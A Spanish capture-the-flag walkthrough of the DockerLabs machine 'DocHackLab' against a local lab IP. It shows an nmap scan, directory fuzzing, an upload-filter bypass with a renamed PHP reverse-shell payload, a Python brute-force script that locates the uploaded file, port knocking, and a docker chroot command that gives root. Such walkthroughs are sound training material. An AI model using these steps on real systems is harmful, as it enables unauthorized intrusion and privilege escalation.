**#Maquina: DocHackLab**

**#Web: dockerlabs.es**

**#Dificultad: Medio** 🟡

-----------------------------------------------------------------------------------------------------------------------------------
**Reconocimiento** 👀

Realizamos un escaneo con Nmap para detectar puertos abiertos y encontramos el 80/http y 22/ssh

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9a:a2:73:65:c5:4f:dd:36:57:7c:53:f6:98:82:96:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLl5D/RfFNy/n10ujddXzLufQCc6uFoQzO3GTzAp1oRBoMxLyljH1pzYcx+5SVEUVCNbbIuVoI14rNqQ3cdm3II=
|   256 c5:f4:bf:93:53:a3:8b:78:0c:8a:b2:fa:30:5b:b3:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGO7g8+mB87DwwgFn0eDDjOUSGVTPZKaI6hkXOGBoHxp
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Chequeamos el puerto 80 el cual es una pagina de Apache por defecto, asi que tenemos que realizar fuzzing web para enumerar directorios.

![Screenshot_3](https://github.com/user-attachments/assets/2019def4-c7d8-4239-bc41-a7330c57bb3f)

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/FUZZ' -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 531ms]
hackademy               [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 0ms]
```

El fuzzing web nos encuentra el directorio /hackademy así que accedemos para ver que contiene y es una carga de archivos que al intentar enviar uno de prueba vemos que tiene un mensaje que solo acepta JPG, JPEG, PNG.

![Captura de pantalla 2024-11-30 135741](https://github.com/user-attachments/assets/46594c2a-7dde-4be4-b382-a655ca2c98a8)

![Captura de pantalla 2024-11-30 135812](https://github.com/user-attachments/assets/c3e36ec9-3068-4f26-aa38-6a993c612179)

-----------------------------------------------------------------------------------------------------------------------------------

**Explotación** 🔥

Generamos un payload que nos entregue un reverse shell y con Burpsuite interceptamos la petición para cambiar la extensión y que nos reciba el archivo.

![Captura de pantalla 2024-11-30 141507](https://github.com/user-attachments/assets/b5fd82fd-d140-4d42-bb90-c791690aa168)

![Captura de pantalla 2024-11-30 141729](https://github.com/user-attachments/assets/af80c264-48ef-48bd-bdfd-2e81188ebaf4)

Como podemos ver, el archivo a sido subido con éxito pero está modificado y no sabemos su ubicación. El mensaje nos deja una pista "ha sido subido y alterado xxx_tuarchivo , localizalo y actua" por lo que ahora tiene tres letras antes del nombre. Para resolver esto podemos hacer un script que nos ayude a problar diferentes combinaciones hasta encontrar la ubicación del payload.

Acá te dejo el script

```
import requests
import string
from itertools import product

# Base URL del archivo
base_url = "http://172.17.0.2/hackademy/"

# Nombre original del archivo
original_name = "payload.jpg.php"

# Generar todas las combinaciones de 3 caracteres
# Usamos letras (minúsculas y mayúsculas) y dígitos
characters = string.ascii_letters + string.digits
combinations = product(characters, repeat=3)

# Probar cada combinación
for combo in combinations:
    prefix = ''.join(combo)  # Convertir la tupla en un string
    url = f"{base_url}{prefix}_{original_name}"
    
    # Hacer la solicitud
    response = requests.get(url)
    
    # Verificar si el archivo existe (HTTP 200 OK)
    if response.status_code == 200:
        print(f"Archivo encontrado: {url}")
        break
else:
    print("No se encontró el archivo.")
```

![Captura de pantalla 2024-11-30 142908](https://github.com/user-attachments/assets/5c0e49af-ce34-409f-bb71-cff07a39cd5e)

El script encontró la ubicación del archivo y vemos que se llama klp_payload.jpg.php y la ubicación http://172.17.0.2/hackademy/klp_payload.jpg.php.

Nos ponemos a la escucha con netcat y llamamos al archivo para conectarnos.

![Captura de pantalla 2024-11-30 143336](https://github.com/user-attachments/assets/8f5d930f-8195-479b-90d9-31d9d008a0b0)

-----------------------------------------------------------------------------------------------------------------------------------

**Escalada de privilegios** 🔝

Entramos al sistema como www-data ahora toca escalar privilegios hasta convertirnos en root. Buscamos posibles usuarios en /etc/passwd vemos que existe el usuario firsthacking.

![Captura de pantalla 2024-11-30 143954](https://github.com/user-attachments/assets/a4b90cc7-acf5-4809-bf7f-e839d4a0dbe0)

Despues de una busqueda de como acceder con dicho usuario, lo que encontramos es que son el comando sudo -l podemos ejecutar comandos como firsthacking.

![Captura de pantalla 2024-11-30 144150](https://github.com/user-attachments/assets/7791eff0-57a2-4e0b-b6e9-0d3fe054b900)

Investigamos en GTFOBins

![Captura de pantalla 2024-11-30 144232](https://github.com/user-attachments/assets/ff61e315-08d7-4d61-95d6-7b539adccca0)

Una vez como el usuario firsthacking, ejecutamos nuevamente sudo -l y vemos que podemos seguir escalando privilegios pero esta vez con /usr/bin/docker. Dentro de GTFObins tenemos la información de cómo hacerlo, pero tenemos una pequeña sorpresa... Tenemos que hacer una llamada.

![Captura de pantalla 2024-11-30 152157](https://github.com/user-attachments/assets/e3543055-2da1-422f-9296-1d2cc8a46dd1)

Levantamos cada puerto antes mencionados en la nota con la herramienta knock en nuestra maquina atacante.

```
└─$ knock -v 172.17.0.2 12345 54321 24680 13579 -d 1
hitting tcp 172.17.0.2:12345
hitting tcp 172.17.0.2:54321
hitting tcp 172.17.0.2:24680
hitting tcp 172.17.0.2:13579
```

Volvemos a intentar con el comando que sacamos de GTFObins

```sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh```

![Captura de pantalla 2024-11-30 161243](https://github.com/user-attachments/assets/5a7f5400-2e93-4a9a-a936-b54099232bd3)

Somos usuario root 😁
Maquina completada 🏆
